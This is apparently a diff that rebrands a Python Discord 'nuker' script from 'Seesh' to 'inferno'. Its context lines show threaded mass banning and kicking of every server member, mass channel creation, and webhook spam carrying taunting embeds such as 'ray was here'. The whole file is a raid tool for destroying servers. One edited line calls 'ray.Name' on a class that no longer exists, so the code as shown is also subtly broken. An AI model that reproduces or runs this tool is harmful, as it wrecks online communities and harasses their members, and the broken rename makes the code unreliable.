@@ -21,10 +21,10 @@ except:
   sys.exit()
 try:
   if os == "Windows":
-    os.system('cls & title [Seesh Nuker] - Starting & mode 69,20') 
+    os.system('cls & title [inferno Nuker] - Starting & mode 69,20') 
 except:
     os.system('clear')
-    os.system('title [Seesh Nuker] - Starting & mode 69,20')
+    os.system('title [inferno Nuker] - Starting & mode 69,20')
 proxy = None
 with open('data/config.json') as f:
     config = json.load(f)
@@ -120,7 +120,7 @@ async def channelids(guildID):
             channelcount += 1
             f.write(str(channel.id) + "\n")
         print(f"\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Scraped \x1b[38;5;213m{channelcount}\033[37m Channels")    
-class Seesh:
+class inferno:
 
     def Name(guild):
         try:
@@ -163,7 +163,7 @@ class Seesh:
                 'description':
                 '.',
                 'url':
-                "https://discord.gg/seesh",
+                "https://discord.gg/animeontop",
                 'color':
                 randcolor,
                 'fields': [{
@@ -181,7 +181,7 @@ class Seesh:
                 }],
                 'author': {
                     'name':
-                    'Seesh fucks you',
+                    'fcked by ray ',
                     'url':
                     'https://media.discordapp.net/attachments/1005729774351691776/1014038921002373150/a_18520f6f7947e5acfdffe8e63b748c2e.gif?width=221&height=221',
                     'icon_url':
@@ -216,14 +216,14 @@ class Seesh:
                     'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162'
                 }
             }, {
-                'url': 'https://discord.gg/seesh',
+                'url': 'https://discord.gg/animeontop',
                 'image': {
                     'url':
                     'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162'
                 }
             }],
             'username':
-            'Seesh Ruins You',
+            'ray was here',
             'avatar_url':
             'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162'
         }
@@ -285,8 +285,8 @@ class Seesh:
             if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                 print(f"\x1b[38;5;213m[\033[37m+\x1b[38;5;213m]\033[37m Created Channel\x1b[38;5;113m {json['name']}\x1b[38;5;15")
                 if spam == True:
-                    webhook = Seesh.CreateWebhook(r.json()['id'])
-                    Thread(target=Seesh.SendWebhook, args=(webhook,)).start()
+                  webhook =inferno.CreateWebhook(r.json()['id'])
+                  Thread(target=inferno.SendWebhook, args=(webhook,)).start()
             else:
                 print(f"\x1b[38;5;213m[\033[37m-\x1b[38;5;213m]\033[37m Couldn't Create Channel\x1b{Fore.LIGHTRED_EX} {json['name']}\x1b[38;5;15")
         except:
@@ -320,7 +320,7 @@ class Seesh:
             pass
 
 async def menu():
-    os.system(f'cls & mode 85,20 & title [Seesh Nuker] - Connected: {client.user}')
+    os.system(f'cls & mode 85,20 & title [inferno Nuker] - Connected: {client.user}')
     print(f'''{Fore.LIGHTRED_EX}
 ░██████╗███████╗███████╗░██████╗██╗░░██╗
 ██╔════╝██╔════╝██╔════╝██╔════╝██║░░██║
@@ -391,12 +391,12 @@ async def menu():
         print(f"\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Total Members: {total}")
         while True:
             #try:
-            Thread(target=Seesh.Ban, args=(guild.id, members_1[num],)).start()
-            Thread(target=Seesh.Ban, args=(guild.id, members_2[num],)).start()
-            Thread(target=Seesh.Ban, args=(guild.id, members_3[num],)).start()
-            Thread(target=Seesh.Ban, args=(guild.id, members_4[num],)).start()
-            Thread(target=Seesh.Ban, args=(guild.id, members_5[num],)).start()
-            Thread(target=Seesh.Ban, args=(guild.id, members_6[num],)).start()
+            Thread(target=inferno.Ban, args=(guild.id, members_1[num],)).start()
+            Thread(target=inferno.Ban, args=(guild.id, members_2[num],)).start()
+            Thread(target=inferno.Ban, args=(guild.id, members_3[num],)).start()
+            Thread(target=inferno.Ban, args=(guild.id, members_4[num],)).start()
+            Thread(target=inferno.Ban, args=(guild.id, members_5[num],)).start()
+            Thread(target=inferno.Ban, args=(guild.id, members_6[num],)).start()
 
             num += 1
             #except IndexError:
@@ -445,9 +445,9 @@ async def menu():
                         pass
         while True:
             #try:
-                Thread(target=Seesh.Kick, args=(guild.id, members_1[num],)).start()
-                Thread(target=Seesh.Kick, args=(guild.id, members_2[num],)).start()
-                Thread(target=Seesh.Kick, args=(guild.id, members_3[num],)).start()
+                Thread(target=inferno.Kick, args=(guild.id, members_1[num],)).start()
+                Thread(target=inferno.Kick, args=(guild.id, members_2[num],)).start()
+                Thread(target=inferno.Kick, args=(guild.id, members_3[num],)).start()
                 num += 1
             #except IndexError:
                # break
@@ -516,7 +516,7 @@ async def menu():
         
 
         for i in range(channel_amount):
-            Thread(target=Seesh.CreateChannel, args=(guild.id,)).start()
+            Thread(target=inferno.CreateChannel, args=(guild.id,)).start()
         
         time.sleep(2)
         await menu()
@@ -557,12 +557,12 @@ async def menu():
                         members_3.append(member)
                     else:
                         pass
-        Seesh.Name(guild.id)
+        ray.Name(guild.id)
         while True:
             try:
-                Thread(target=Seesh.Ban, args=(guild.id, members_1[num],)).start()
-                Thread(target=Seesh.Ban, args=(guild.id, members_2[num],)).start()
-                Thread(target=Seesh.Ban, args=(guild.id, members_3[num],)).start()
+                Thread(target=inferno.Ban, args=(guild.id, members_1[num],)).start()
+                Thread(target=inferno.Ban, args=(guild.id, members_2[num],)).start()
+                Thread(target=inferno.Ban, args=(guild.id, members_3[num],)).start()
                 num += 1
             except IndexError:
                 break
@@ -587,7 +587,7 @@ async def menu():
                 pass
         channel_amount = 50
         for i in range(channel_amount):
-            Thread(target=Seesh.CreateChannel, args=(guild.id,)).start()
+            Thread(target=inferno.CreateChannel, args=(guild.id,)).start()
         await time.sleep(2)
         await menu()
     await asyncio.wait([menu()])
@@ -599,7 +599,7 @@ try:
     RPC = Presence(client.user.id)
     RPC.connect() 
 
-    RPC.update(details="Main Menu", large_image="Seesh", small_image="Seesh", large_text="Seesh Nuker", start=time.time())
+    RPC.update(details="Main Menu", large_image="inferno", small_image="inferno", large_text="inferno Nuker", start=time.time())
 except:
     pass
 @client.event
